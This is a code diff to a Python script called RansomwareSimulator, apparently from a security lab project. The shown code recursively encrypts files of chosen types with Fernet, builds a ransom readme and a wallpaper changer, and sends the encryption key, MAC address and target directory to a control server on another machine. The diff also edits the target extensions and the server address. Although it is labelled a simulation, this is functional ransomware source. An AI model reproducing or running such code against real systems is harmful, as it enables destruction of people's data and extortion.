@@ -6,7 +6,7 @@ import ctypes
 import socket
 import subprocess
 from cryptography.fernet import Fernet
-
+import base64
 
 class RansomwareSimulator:
     def __init__(self, directory, server_host, server_port, file_extensions):
@@ -18,10 +18,21 @@ class RansomwareSimulator:
 
     def change_wallpaper(self, image_path):
         if os.name == 'nt':
-            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path , 0)
 
         else:
             print("Wallpaper change feature is not supported on this OS.")
+
+    def convert_image_to_base64(self, image_path):
+        with open(image_path, 'rb') as image_file:
+            # Read the image file in binary mode
+            binary_data = image_file.read()
+            # Encode the binary data to base64
+            base64_encoded_data = base64.b64encode(binary_data)
+            # Decode the base64 bytes to string
+            base64_message = base64_encoded_data.decode('utf-8')
+            return base64_message
+
 
     def get_mac_address(self):
         mac_num = hex(uuid.getnode()).replace('0x', '').upper()
@@ -29,15 +40,15 @@ class RansomwareSimulator:
         mac = ':'.join(mac_num[i: i + 2] for i in range(0, 12, 2))
         return mac
 
+
     def create_readme(self):
-        home_dir_path = os.path.join(os.environ.get('USERPROFILE', os.environ.get('HOME', '')))
-        desktop_path = os.path.join(home_dir_path, 'Desktop')
+        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
         readme_path = os.path.join(desktop_path, 'Readme.txt')
         with open(readme_path, 'w') as file:
             file.write("This is a simulation program, your files are encrypted.")
 
+
     def encrypt_file(self, file_path):
-        print(f'Used key:{self.key}')
         fernet = Fernet(self.key)
         with open(file_path, 'rb') as file:
             original = file.read()
@@ -52,11 +63,7 @@ class RansomwareSimulator:
 
     def find_and_encrypt_files(self):
         encrypted_files = []
-        print(f'directory:{self.directory}')
-        for root, dirs, files in os.walk(self.directory):
-            print(f"Currently in: {root}")
-            print(f"Subdirectories: {dirs}")
-            print(f"Files: {files}")
+        for root, _, files in os.walk(self.directory):
             for file in files:
                 if any(file.endswith(ext) for ext in self.file_extensions):
                     file_path = os.path.join(root, file)
@@ -75,14 +82,16 @@ class RansomwareSimulator:
 
     def collect_data(self):
         return {
-            'hostname': socket.gethostname(),
             'key': self.key.decode(),
-            'active_users': self.get_active_users(),
-            'mac_address': self.get_mac_address()
+            'mac_address': self.get_mac_address(),
+            'command': 'encode',
+            'directory': self.directory,
+            'bg': True
         }
 
     def send_data_to_server(self):
         data = self.collect_data()
+        print(f"data:{json.dumps(data)}")
         self.send_to_server(json.dumps(data))
 
     def send_to_server(self, data):
@@ -97,20 +106,16 @@ class RansomwareSimulator:
         gc.collect()
         print("Memory cleared.")
 
-
 def main():
-    file_extensions = ['.txt', '.docx', '.zip', '.pdf']
-    directory = '/home/kali/demo/'
-    server_host = '127.0.0.1'
+    file_extensions = ['.txt', '.docx', '.jpg', '.pdf']
+    directory = '/home/kali/demo/'  # 'dosyalar/' should be replaced with the directory path you want to target
+    server_host = '192.168.181.129' # IP of target that run ControlServer.py (check using ifconfig command)
     server_port = 12345
 
     simulator = RansomwareSimulator(directory, server_host, server_port, file_extensions)
     simulator.find_and_encrypt_files()
     simulator.send_data_to_server()
-    # simulator.change_wallpaper(wallpaper_path)  # Change the wallpaper
-    simulator.create_readme()
     simulator.clear_memory()
-
 
 if __name__ == "__main__":
     main()
